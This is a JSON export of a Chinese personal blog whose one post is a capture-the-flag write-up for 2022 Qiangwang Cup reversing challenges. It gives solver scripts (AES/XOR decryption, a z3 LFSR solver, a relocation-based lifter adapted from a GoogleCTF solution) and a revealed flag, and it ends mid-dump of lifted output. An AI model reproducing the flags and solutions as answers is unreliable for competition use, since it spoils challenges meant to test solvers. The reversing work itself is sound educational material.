{"meta":{"title":"1ens's blog","subtitle":"","description":"a","author":"1ens","url":"http://example.com"},"pages":[{"title":"","date":"2022-05-24T15:09:56.842Z","updated":"2022-05-24T15:09:56.842Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2022-05-25T03:46:23.885Z","updated":"2022-05-25T03:46:23.885Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个菜鸡逆向选手"},{"title":"","date":"2022-05-24T15:03:31.990Z","updated":"2022-05-24T15:03:31.990Z","comments":true,"path":"mylist/index.html","permalink":"http://example.com/mylist/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2022-05-24T15:06:34.544Z","updated":"2022-05-24T15:06:34.544Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"big lao","text":"big lao 带带"},{"title":"所有标签","date":"2022-05-24T15:02:51.734Z","updated":"2022-05-24T15:02:51.734Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2022-05-24T15:02:08.935Z","updated":"2022-05-24T15:02:08.935Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"强网杯","slug":"强网杯","date":"2022-08-01T16:00:00.000Z","updated":"2022-08-07T13:32:49.815Z","comments":true,"path":"2022/08/02/强网杯/","link":"","permalink":"http://example.com/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF/","excerpt":"","text":"GameMaster.net程序 主要逻辑为异或和aes加密，解密message文件 12345678910111213from Crypto.Cipher import AESkey=bytes([66,114,97,105,110,115,116,111,114,109,105,110,103,33,33,33])f=open(&#x27;gamemessage&#x27;,&#x27;rb&#x27;)stream=f.read()enc=[]for i in stream: enc.append(i^34)ae=AES.new(key,AES.MODE_ECB)m=ae.decrypt(bytes(enc))f.close()ff=open(&#x27;flag&#x27;,&#x27;wb&#x27;)ff.write(m)ff.close() 得到文件用010edit打开，然后根据文件头提取文件，也是.net文件，dnspy打开 12345678910111213141516171819from z3 import *f=[101,5,80,213,163,26,59,38,19,6,173,189,198,166,140,183,42,247,223,24,106,20,145,37,24,7,22,191,110,179,227,5,62,9,13,17,65,22,37,5]x=BitVec(&#x27;x&#x27;,33)y=BitVec(&#x27;y&#x27;,33)z=BitVec(&#x27;z&#x27;,33)s=Solver()nums=-1k=[0]*40for i in range(320): x = (((x &gt;&gt; 29 ^ x &gt;&gt; 28 ^ x &gt;&gt; 25 ^ x &gt;&gt; 23) &amp; 1) | x &lt;&lt; 1) y = (((y &gt;&gt; 30 ^ y &gt;&gt; 27) &amp; 1) | y &lt;&lt; 1) z = (((z &gt;&gt; 31 ^ z &gt;&gt; 30 ^ z &gt;&gt; 29 ^ z &gt;&gt; 28 ^ z &gt;&gt; 26 ^ z &gt;&gt; 24) &amp; 1) | z &lt;&lt; 1) if i%8==0: nums+=1 k[nums]=((k[nums]&lt;&lt;1)|((z &gt;&gt; 32 &amp; 1 &amp; (x &gt;&gt; 30 &amp; 1)) ^ (((z &gt;&gt; 32 &amp; 1) ^ 1) &amp; (y &gt;&gt; 31 &amp; 1))))&amp;0xfffor i in range(40): s.add(k[i]==f[i])if s.check()==sat: print(s.model()) 还有移位然后异或的操作 123456789101112131415s=[60,100,36,86,51,251,167,108,116,245,207,223,40,103,34,62,22,251,227]z = 3131229747y = 868387187x = 156324965L[0]=xL[1]=yL[2]=zfor i in range(3): for j in range(4): key[i * 4 + j] = ((L[i] &gt;&gt; j * 8) &amp; 255)for i in range(len(s)): print(chr(s[i]^key[i%len(key)]),end=&#x27;&#x27;)#Y0u_@re_G3meM3s7er! deeprevGooglectf的一道同类型题，找到网上的脚本，format_addr函数修改了一下 GoogleCTF 2022 - eldar (333 pt &#x2F; 14 solves) (harrisongreen.me) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549# Author: hgarrereyn# Desc: Lifter solution for GoogleCTF 2022 eldarimport lieffrom collections import namedtuplefrom dataclasses import dataclassfrom typing import Anyfrom capstone import *md = Cs(CS_ARCH_X86, CS_MODE_64)b = Nonetry: b = lief.ELF.parse(&#x27;./deeprev&#x27;)except: raise Exception(&#x27;Must have the ./eldar binary in cwd&#x27;)rela = [x for x in b.sections if x.name == &#x27;.rela.dyn&#x27;][0]print(rela)dynsym = [x for x in b.sections if x.name == &#x27;.dynsym&#x27;][0]@dataclassclass Symbol(object): idx: int def __repr__(self): return f&#x27;s&#123;self.idx&#125;&#x27; @dataclassclass Reloc(object): idx: int def __repr__(self): return f&#x27;r&#123;self.idx&#125;&#x27;@dataclassclass Ref(object): val: Any def __repr__(self): return f&#x27;&amp;&#123;self.val&#125;&#x27;@dataclassclass SymAddr(object): sym: Symbol field: str def __repr__(self): return f&#x27;&#123;self.sym&#125;.&#123;self.field&#125;&#x27;@dataclassclass RelocAddr(object): reloc: Reloc field: str def __repr__(self): return f&#x27;&#123;self.reloc&#125;.&#123;self.field&#125;&#x27; def vaddr(self): off = 0 match self.field: case &#x27;r_address&#x27;:off = 0 case &#x27;r_info&#x27;: off = 8 case &#x27;r_addend&#x27;: off = 16 return (self.reloc.idx * 24) + off + rela.virtual_address @dataclassclass FlagAddr(object): idx: int def __repr__(self): return f&#x27;flag[&#123;self.idx&#125;]&#x27;@dataclassclass OutAddr(object): idx: int def __repr__(self): return f&#x27;out[&#123;self.idx&#125;]&#x27; @dataclassclass ArrAddr(object): idx: int def __repr__(self): return f&#x27;arr[&#123;self.idx&#125;]&#x27;BaseAddr = namedtuple(&#x27;baseaddr&#x27;, [])FailAddr = namedtuple(&#x27;fail&#x27;, [])def format_addr(addr: int): if addr &gt;= rela.virtual_address and addr &lt; rela.virtual_address + rela.size: offset = addr - rela.virtual_address r_offset = (offset // 24) r_rem = offset % 24 if r_offset &gt;= 3 and r_offset &lt;= 88: arr_idx = (r_offset - 3) * 3 + (r_rem // 8) return ArrAddr(arr_idx) elif r_offset == 89: return OutAddr(r_rem) match r_rem: case 0: return RelocAddr(Reloc(r_offset), &#x27;r_address&#x27;) case 8: return RelocAddr(Reloc(r_offset), &#x27;r_info&#x27;) case 16: return RelocAddr(Reloc(r_offset), &#x27;r_addend&#x27;) case _: return RelocAddr(Reloc(r_offset), r_rem) elif addr &gt; dynsym.virtual_address and addr &lt; dynsym.virtual_address + dynsym.size: offset = addr - dynsym.virtual_address r_offset = (offset // 24) r_rem = offset % 24 match r_rem: case 0: return SymAddr(Symbol(r_offset), &#x27;st_name&#x27;) case 8: return Symbol(r_offset) case 16: return SymAddr(Symbol(r_offset), &#x27;st_size&#x27;) case _: return SymAddr(Symbol(r_offset), r_rem) elif addr &gt;= 0x404040 and addr &lt; 0x404040+33: off = addr-0x404040 return FlagAddr(off) elif addr == 0x804000: return BaseAddr() elif addr == 0x404064: return FailAddr() else: return addrdef to_sym(name): assert len(name) == 1 return Symbol(ord(name[0]))Rel = namedtuple(&#x27;REL&#x27;, [&#x27;dst&#x27;,&#x27;val&#x27;,&#x27;ridx&#x27;])Copy = namedtuple(&#x27;CPY&#x27;, [&#x27;dst&#x27;, &#x27;symbol&#x27;, &#x27;ridx&#x27;])R64 = namedtuple(&#x27;R64&#x27;, [&#x27;dst&#x27;,&#x27;symbol&#x27;,&#x27;addend&#x27;,&#x27;ridx&#x27;])R32 = namedtuple(&#x27;R32&#x27;, [&#x27;dst&#x27;,&#x27;symbol&#x27;,&#x27;addend&#x27;,&#x27;ridx&#x27;])def parse(b) -&gt; list: print(&#x27;[*] Loading relocations...&#x27;) relocs = list(b.relocations) print(&#x27;[*] Parsing...&#x27;) instructions = [] for i in range(3, len(relocs)): r = relocs[i] match r.type: case 1: # R64 instructions.append(R64(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i)) case 5: # CPY instructions.append(Copy(format_addr(r.address), to_sym(r.symbol.name), i)) case 8: # REL instructions.append(Rel(format_addr(r.address), format_addr(r.addend), i)) case 10: # R32 instructions.append(R32(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i)) return instructionsMov = namedtuple(&#x27;mov&#x27;, [&#x27;dst&#x27;, &#x27;src&#x27;, &#x27;sz&#x27;, &#x27;ridx&#x27;])Add = namedtuple(&#x27;add&#x27;, [&#x27;dst&#x27;, &#x27;src&#x27;, &#x27;addend&#x27;, &#x27;ridx&#x27;])def lift_mov_add(instructions): idx = 0 sizes = [] curr = [8] * 8 sizes.append(curr) for instr in instructions: c = list(curr) match instr: case Rel(SymAddr(Symbol(idx), &#x27;st_size&#x27;), val, ridx): c[idx] = val sizes.append(c) while idx &lt; len(instructions): match instructions[idx]: case Rel(dst, val, ridx): instructions[idx] = Mov(dst, Ref(val), 8, ridx) case Copy(dst, sym, ridx): instructions[idx] = Mov(dst, sym, sizes[idx][sym.idx], ridx) case R64(dst, sym, add, ridx): instructions[idx] = Add(dst, sym, add, ridx) idx += 1 return instructionsdef remove_sizes(instructions): # Sizes are now nops idx = 0 while idx &lt; len(instructions): match instructions[idx]: case Mov(SymAddr(Symbol(s), &#x27;st_size&#x27;), _, _, _) if s != 3: instructions[idx:idx+1] = [] idx += 1 return instructionsdef lift_indirect(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+3]: case [ Mov(RelocAddr(Reloc(rel_1), &#x27;r_addend&#x27;), Symbol(sidx_1), sz_1, ridx_1), Add(dst_2, sym_2, _, ridx_2), Mov(RelocAddr(Reloc(rel_3), &#x27;r_addend&#x27;), Ref(0), sz_3, _), ] if ( (rel_1 == ridx_2) and (rel_3 == ridx_2) ): instructions[idx:idx+3] = [ Add(dst_2, sym_2, Symbol(sidx_1), ridx_1) ] idx += 1 return instructionsBlock = namedtuple(&#x27;block&#x27;, [&#x27;arr&#x27;, &#x27;flag&#x27;, &#x27;ridx&#x27;])Output = namedtuple(&#x27;output&#x27;, [&#x27;out&#x27;, &#x27;arr&#x27;, &#x27;ridx&#x27;])def lift_block(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+18]: case [ Mov(_,arr,_,ridx), Add(_,_,_,_), Mov(_,flag,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), ]: instructions[idx:idx+18] = [ Block(arr, flag, ridx) ] idx += 1 return instructionsReset = namedtuple(&#x27;reset&#x27;, [&#x27;ridx&#x27;])ShuffleBlock = namedtuple(&#x27;shuffleblock&#x27;, [&#x27;f1&#x27;, &#x27;f2&#x27;, &#x27;ridx&#x27;])def lift_reset(instructions): idx = 0 while idx &lt; len(instructions) - 256: good = True for i in range(256): op = instructions[idx+i] if type(op) == Mov: dst, src, _, _ = op if dst != ArrAddr(i) or src != Ref(i): good = False break else: good = False break if good: instructions[idx:idx+256] = [Reset(instructions[idx].ridx)] idx += 1 return instructionsdef lift_shuffle_block(instructions): idx = 0 while idx &lt; len(instructions) - 256: good = True for i in range(256): op = instructions[idx+i] if type(op) == Block: arr, flag, ridx = op if arr != Ref(ArrAddr(i)): good = False break else: good = False break if good: instructions[idx:idx+256] = [ShuffleBlock(instructions[idx].flag, instructions[idx+1].flag, instructions[idx].ridx)] idx += 1 return instructionsOutput = namedtuple(&#x27;output&#x27;, [&#x27;out&#x27;, &#x27;arr&#x27;, &#x27;ridx&#x27;])def lift_output(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+26]: case [ Mov(_,arr,_,ridx), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), R32(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Mov(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Add(_,_,_,_), Mov(out,_,_,_), ]: instructions[idx:idx+26] = [Output(out, arr, ridx)] idx += 1 return instructionsMultAdd = namedtuple(&#x27;multadd&#x27;, [&#x27;out&#x27;, &#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_multadd(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+3]: # block prefix case [ Mov(Symbol(2), out, _, ridx), Mov(Symbol(5), Symbol(2), _, _), Mov(Symbol(6), Ref(0), _, _), ]: k = 0 double = False ptr = idx + 3 good = True while ptr &lt; len(instructions): match instructions[ptr]: case Mov(Symbol(2), Ref(Symbol(6)), _, _): double = True case Mov(Symbol(2), Ref(Symbol(5)), _, _): double = False case Add(Symbol(6), Symbol(6), Symbol(2), _): k = (k * 2) if double else (k + 1) case Add(Symbol(7), Symbol(7), Symbol(2), _): ptr += 1 break case _: good = False break ptr += 1 if good: instructions[idx:ptr] = [ MultAdd(Symbol(7), out, k, ridx) ] idx += 1 return instructionsTrunc = namedtuple(&#x27;trunc&#x27;, [&#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_truncate(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+2]: case [ Mov(Symbol(2), Ref(SymAddr(Symbol(5), 11)), _, ridx), Mov(SymAddr(Symbol(7), 11), Symbol(2), 5, _) ]: instructions[idx:idx+2] = [ Trunc(Symbol(7), 0xffffff, ridx)] idx += 1 return instructionsArraySlots = namedtuple(&#x27;arr&#x27;, [&#x27;values&#x27;, &#x27;ridx&#x27;])def lift_array_slots(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx]: case Mov(BaseAddr(), Ref(0), _, ridx): ptr = idx+1 while ptr &lt; len(instructions): op = instructions[ptr] if type(op) != Mov or op.dst != BaseAddr(): break ptr += 1 start = idx end = ptr data = [] # Check for movs into array. vstart = RelocAddr(Reloc(ridx), &#x27;r_address&#x27;).vaddr() offset = 0 while end + offset &lt; len(instructions) and offset &lt; ((end - start) * 3): op = instructions[end + offset] if type(op) == Mov and type(op.dst) is RelocAddr and op.dst.vaddr() == vstart + (offset * 8): data.append(op.src.val) else: break offset += 1 if len(data) &gt; 0: data += [0] * (((end - start) * 3) - len(data)) instructions[idx:end+offset] = [ ArraySlots(data, ridx) ] idx += 1 return instructionsShellcode = namedtuple(&#x27;shellcode&#x27;, [&#x27;dst&#x27;, &#x27;code&#x27;, &#x27;ridx&#x27;])def lift_shellcode(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+6]: case [ ArraySlots(values, ridx), Mov(Symbol(3), Ref(RelocAddr(Reloc(rel2), &#x27;r_address&#x27;)), _, _), Mov(SymAddr(Symbol(3), &#x27;st_name&#x27;), _, _, _), Add(dst, Symbol(3), _, _), Mov(Symbol(2), _, _, _), Mov(RelocAddr(Reloc(rel6), &#x27;r_address&#x27;), Symbol(2), _, _) ] if (rel2 == ridx) and (rel6 == ridx): instructions[idx:idx+6] = [ Shellcode(dst, b&#x27;&#x27;.join([(x &amp; 0xffffffffffffffff).to_bytes(8, &#x27;little&#x27;) for x in values]), ridx) ] idx += 1 return instructionsAop = namedtuple(&#x27;aop&#x27;, [&#x27;dst&#x27;, &#x27;op&#x27;, &#x27;val&#x27;, &#x27;k&#x27;, &#x27;ridx&#x27;])def lift_aop(instructions): idx = 0 while idx &lt; len(instructions): match instructions[idx:idx+5]: case [ Mov(Symbol(2), val, _, ridx), Mov(Symbol(5), Symbol(2), _, _), Shellcode(_, data, _), Mov(Symbol(2), Ref(Symbol(5)), _, _), Add(dst, dst2, Symbol(2), _) ] if len(data) == 24 and (dst == dst2): op = next(md.disasm(data, 0)) t = op.mnemonic k = int(op.op_str.split(&#x27;, &#x27;)[-1], 16) instructions[idx:idx+5] = [ Aop(dst, t, val, k, ridx) ] idx += 1 return instructionsdef dump(instructions): for op in instructions: match op: case Mov(SymAddr(sym, &#x27;st_name&#x27;), Ref(val), 8, ridx) if type(val) is int: name = val &amp; 0xffffffff info = (val &gt;&gt; 4) &amp; 0xff other = (val &gt;&gt; 5) &amp; 0xff shndx = (val &gt;&gt; 6) &amp; 0xffff print(f&#x27;[&#123;ridx:04d&#125;] :: setinfo &#123;sym&#125;, name=0x&#123;name:x&#125;, info=0x&#123;info:x&#125;, other=0x&#123;other:x&#125;, shndx=0x&#123;shndx:x&#125;&#x27;) case Mov(BaseAddr(), Ref(0), _, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: [ARRAY SLOT]&#x27;) case Mov(dst, src, 8, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: mov &#123;dst&#125;, &#123;src&#125;&#x27;) case Mov(dst, src, sz, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: mov(&#123;sz&#125;) &#123;dst&#125;, &#123;src&#125;&#x27;) case Add(dst, src, add, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: add &#123;dst&#125;, &#123;src&#125;, &#123;add&#125;&#x27;) case R32(dst, src, add, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: r32 &#123;dst&#125;, &#123;src&#125;, &#123;add&#125;&#x27;) case Block(arr, flag, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: shuffle &#123;arr&#125;, &#123;flag&#125;&#x27;) case Output(out, arr, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: output &#123;out&#125;, &#123;arr&#125;&#x27;) case ShuffleBlock(f1, f2, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: shuffleblock &#123;f1&#125;, &#123;f2&#125;&#x27;) case MultAdd(dst, val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: madd &#123;dst&#125; += (&#123;val&#125; * &#123;k&#125;)&#x27;) case Aop(dst, op, val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: aop &#123;dst&#125; += (&#123;val&#125; &#123;op&#125; &#123;k&#125;)&#x27;) case Reset(ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: reset&#x27;) case Trunc(val, k, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: trunc &#123;val&#125; &amp;= 0x&#123;k:x&#125;&#x27;) case ArraySlots(values, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: array [&#123;&quot;, &quot;.join([hex(x) for x in values])&#125;]&#x27;) case Shellcode(dst, code, ridx): print(f&#x27;[&#123;ridx:04d&#125;] :: exec &#123;dst&#125; &lt;- &#123;code.hex()&#125;&#x27;) print(&#x27;-&#x27; * 20) for i in md.disasm(code, 0): if i.mnemonic == &#x27;ret&#x27;: break print(&quot; 0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str.replace(&#x27;0x8040e4&#x27;, &#x27;s5&#x27;).replace(&#x27;0x8040cc&#x27;, &#x27;s4&#x27;))) print(&#x27;-&#x27; * 20) case _: print(op)LIFTS = [ lift_mov_add, remove_sizes, lift_indirect, lift_block, lift_reset, lift_shuffle_block, lift_output, lift_multadd, lift_truncate, lift_array_slots, lift_shellcode, lift_aop,]def lift(instructions): for lift_fn in LIFTS: print(f&#x27;[*] &#123;lift_fn.__name__&#125;...&#x27;) instructions = lift_fn(instructions) return instructionsinstructions = parse(b)instructions = lift(instructions)dump(instructions) 得到： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757[0005] :: mov s2, &amp;flag[0][0007] :: mov(1) s4, s2[0008] :: [ARRAY SLOT][0009] :: mov arr[15], &amp;1585408084625667200[0010] :: mov arr[16], &amp;195[0011] :: mov s3, &amp;arr[15][0012] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0013] :: add arr[15], s3, 0[0014] :: mov s2, &amp;r101002.r_address[0016] :: mov(24) arr[15], s2[0017] :: [ARRAY SLOT][0018] :: mov arr[42], &amp;141015791240320[0019] :: mov arr[43], &amp;195[0020] :: mov s3, &amp;arr[42][0021] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0022] :: add arr[42], s3, 0[0023] :: mov arr[42], s2[0024] :: mov s2, &amp;s4[0026] :: mov(1) arr[0], s2[0027] :: mov s2, &amp;flag[1][0028] :: mov s4, s2[0029] :: [ARRAY SLOT][0030] :: mov arr[78], &amp;1657465678663595136[0031] :: mov arr[79], &amp;195[0032] :: mov s3, &amp;arr[78][0033] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0034] :: add arr[78], s3, 0[0035] :: mov s2, &amp;r101002.r_address[0037] :: mov(24) arr[78], s2[0038] :: [ARRAY SLOT][0039] :: mov arr[105], &amp;72198609829168256[0040] :: mov arr[106], &amp;195[0041] :: mov s3, &amp;arr[105][0042] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0043] :: add arr[105], s3, 0[0044] :: mov arr[105], s2[0045] :: mov s2, &amp;s4[0047] :: mov(1) arr[0], s2[0048] :: mov s2, &amp;flag[2][0049] :: mov s4, s2[0050] :: [ARRAY SLOT][0051] :: mov arr[141], &amp;1153062520398099584[0052] :: mov arr[142], &amp;195[0053] :: mov s3, &amp;arr[141][0054] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0055] :: add arr[141], s3, 0[0056] :: mov s2, &amp;r101002.r_address[0058] :: mov(24) arr[141], s2[0059] :: [ARRAY SLOT][0060] :: mov arr[168], &amp;144256203867096192[0061] :: mov arr[169], &amp;195[0062] :: mov s3, &amp;arr[168][0063] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0064] :: add arr[168], s3, 0[0065] :: mov arr[168], s2[0066] :: mov s2, &amp;s4[0068] :: mov(1) arr[0], s2[0069] :: mov s2, &amp;flag[3][0070] :: mov s4, s2[0071] :: [ARRAY SLOT][0072] :: mov arr[204], &amp;1297177708473955456[0073] :: mov arr[205], &amp;195[0074] :: mov s3, &amp;arr[204][0075] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0076] :: add arr[204], s3, 0[0077] :: mov s2, &amp;r101002.r_address[0079] :: mov(24) arr[204], s2[0080] :: [ARRAY SLOT][0081] :: mov arr[231], &amp;216313797905024128[0082] :: mov arr[232], &amp;195[0083] :: mov s3, &amp;arr[231][0084] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0085] :: add arr[231], s3, 0[0086] :: mov arr[231], s2[0087] :: mov s2, &amp;s4[0089] :: mov(1) arr[0], s2[0090] :: mov s2, &amp;flag[4][0091] :: mov s4, s2[0092] :: exec r92.r_address &lt;- 803425cc40800010c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x10--------------------[0101] :: array [0x4008040cc250480, 0xc3, 0x0][0104] :: mov s3, &amp;r101.r_address[0105] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0106] :: add r101.r_address, s3, 0[0107] :: mov r101.r_address, s2[0108] :: mov s2, &amp;s4[0110] :: mov(1) arr[0], s2[0111] :: mov s2, &amp;flag[5][0112] :: mov s4, s2[0113] :: exec r113.r_address &lt;- 803425cc40800011c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x11--------------------[0122] :: array [0x5008040cc250480, 0xc3, 0x0][0125] :: mov s3, &amp;r122.r_address[0126] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0127] :: add r122.r_address, s3, 0[0128] :: mov r122.r_address, s2[0129] :: mov s2, &amp;s4[0131] :: mov(1) arr[0], s2[0132] :: mov s2, &amp;flag[6][0133] :: mov s4, s2[0134] :: exec r134.r_address &lt;- 803425cc40800012c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x12--------------------[0143] :: array [0x6008040cc250480, 0xc3, 0x0][0146] :: mov s3, &amp;r143.r_address[0147] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0148] :: add r143.r_address, s3, 0[0149] :: mov r143.r_address, s2[0150] :: mov s2, &amp;s4[0152] :: mov(1) arr[0], s2[0153] :: mov s2, &amp;flag[7][0154] :: mov s4, s2[0155] :: exec r155.r_address &lt;- 803425cc40800013c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x13--------------------[0164] :: array [0x7008040cc250480, 0xc3, 0x0][0167] :: mov s3, &amp;r164.r_address[0168] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0169] :: add r164.r_address, s3, 0[0170] :: mov r164.r_address, s2[0171] :: mov s2, &amp;s4[0173] :: mov(1) arr[0], s2[0174] :: mov s2, &amp;flag[8][0175] :: mov s4, s2[0176] :: exec r176.r_address &lt;- 803425cc40800014c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x14--------------------[0185] :: array [0x8008040cc250480, 0xc3, 0x0][0188] :: mov s3, &amp;r185.r_address[0189] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0190] :: add r185.r_address, s3, 0[0191] :: mov r185.r_address, s2[0192] :: mov s2, &amp;s4[0194] :: mov(1) arr[1], s2[0195] :: mov s2, &amp;flag[9][0196] :: mov s4, s2[0197] :: exec r197.r_address &lt;- 803425cc40800015c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x15--------------------[0206] :: array [0x9008040cc250480, 0xc3, 0x0][0209] :: mov s3, &amp;r206.r_address[0210] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0211] :: add r206.r_address, s3, 0[0212] :: mov r206.r_address, s2[0213] :: mov s2, &amp;s4[0215] :: mov(1) arr[1], s2[0216] :: mov s2, &amp;flag[10][0217] :: mov s4, s2[0218] :: exec r218.r_address &lt;- 803425cc40800016c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x16--------------------[0227] :: array [0xa008040cc250480, 0xc3, 0x0][0230] :: mov s3, &amp;r227.r_address[0231] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0232] :: add r227.r_address, s3, 0[0233] :: mov r227.r_address, s2[0234] :: mov s2, &amp;s4[0236] :: mov(1) arr[1], s2[0237] :: mov s2, &amp;flag[11][0238] :: mov s4, s2[0239] :: exec r239.r_address &lt;- 803425cc40800017c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x17--------------------[0248] :: array [0xb008040cc250480, 0xc3, 0x0][0251] :: mov s3, &amp;r248.r_address[0252] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0253] :: add r248.r_address, s3, 0[0254] :: mov r248.r_address, s2[0255] :: mov s2, &amp;s4[0257] :: mov(1) arr[1], s2[0258] :: mov s2, &amp;flag[12][0259] :: mov s4, s2[0260] :: exec r260.r_address &lt;- 803425cc40800018c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x18--------------------[0269] :: array [0xc008040cc250480, 0xc3, 0x0][0272] :: mov s3, &amp;r269.r_address[0273] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0274] :: add r269.r_address, s3, 0[0275] :: mov r269.r_address, s2[0276] :: mov s2, &amp;s4[0278] :: mov(1) arr[1], s2[0279] :: mov s2, &amp;flag[13][0280] :: mov s4, s2[0281] :: exec r281.r_address &lt;- 